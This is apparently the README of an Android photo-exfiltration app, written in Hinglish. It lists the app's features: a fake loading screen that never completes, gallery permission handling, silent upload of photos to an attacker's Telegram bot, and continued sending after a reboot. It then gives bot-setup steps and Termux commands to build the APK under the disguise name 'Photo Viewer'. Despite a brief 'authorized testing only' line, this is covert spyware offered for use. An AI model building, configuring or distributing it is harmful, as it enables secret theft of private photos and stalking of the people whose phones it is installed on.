# tg-photo-exfil

Android APK jo gallery photos ko Telegram bot pe bhejta hai.
Sirf authorized testing / apne devices pe use karo.

## Features
- Fake "Loading..." screen (kabhi complete nahi hoti)
- Gallery permission (Android 13+ ka READ_MEDIA_IMAGES bhi handled)
- Photos Telegram bot pe upload (10MB+ ke liye sendDocument fallback)
- Jo photo bhej chuka hai usse dubara nahi bhejta
- Reboot ke baad naye photos bhi send

## Telegram Bot Setup
1. Telegram me @BotFather kholo → /newbot → naam do → BOT_TOKEN mil jayega
2. CHAT_ID: @userinfobot ko koi bhi message bhejo → id mil jayegi
3. Apne bot ko pehle ek baar message bhej do (chat activate ho jaye)

## Termux Build
```bash
pkg update && pkg upgrade
pkg install aapt apksigner zipalign ecj d8 openjdk-17 curl unzip git
git clone https://github.com/USERNAME/tg-photo-exfil.git
cd tg-photo-exfil
chmod +x build.sh
./build.sh <BOT_TOKEN> <CHAT_ID> "Photo Viewer"
